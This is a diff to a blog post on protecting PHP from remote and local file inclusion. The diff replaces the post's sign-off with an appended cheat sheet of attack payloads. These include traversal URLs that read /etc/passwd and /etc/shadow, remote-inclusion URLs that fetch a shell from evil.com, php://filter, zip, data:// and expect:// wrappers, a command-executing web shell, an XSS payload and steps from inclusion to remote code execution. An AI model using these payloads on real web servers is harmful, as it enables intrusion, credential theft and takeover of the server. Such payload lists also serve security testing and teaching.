@@ -88,4 +88,90 @@ return ($ input);
 
 Now I hope you can see what’s going on inside this function, so you can add yours. I would suggest using the str_replace () function and there are a lot of other functions to clear them. Be considerate and stop the RFI & LFI exploit frenzy!
 
-This is the end of my blog! Thank you for taking the time to read (:
+#### Basic LFI (null byte, double encoding and other tricks)
+
+```
+http://example.com/index.php?page=etc/passwd
+http://example.com/index.php?page=etc/passwd%00
+http://example.com/index.php?page=../../etc/passwd
+http://example.com/index.php?page=%252e%252e%252f
+http://example.com/index.php?page=....//....//etc/passwd
+```
+
+Interesting files to check out :
+
+```
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+```
+
+#### Basic RFI (null byte, double encoding and other tricks)
+
+```
+http://example.com/index.php?page=http://evil.com/shell.txt
+http://example.com/index.php?page=http://evil.com/shell.txt%00
+http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
+```
+
+#### LFI / RFI Wrappers
+
+LFI Wrapper rot13 and base64 - php://filter case insensitive.
+
+```
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+
+Can be chained with a compression wrapper.
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+```
+
+#### LFI Wrapper ZIP
+
+```
+echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;   
+mv payload.zip shell.jpg;    
+rm payload.php   
+
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
+
+#### RFI Wrapper DATA with "" payload
+
+```
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+```
+
+#### RFI Wrapper EXPECT
+
+```
+http://example.com/index.php?page=php:expect://id
+http://example.com/index.php?page=php:expect://ls
+```
+
+#### XSS via RFI/LFI with "" payload
+
+```
+http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+```
+
+#### LFI to RCE via /proc/*/fd
+ 
+ 1. Upload a lot of shells (for example : 100)
+ 2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
+ 
+#### LFI to RCE via Upload
+
+```
+http://example.com/index.php?page=path/to/uploaded/file.png
+```
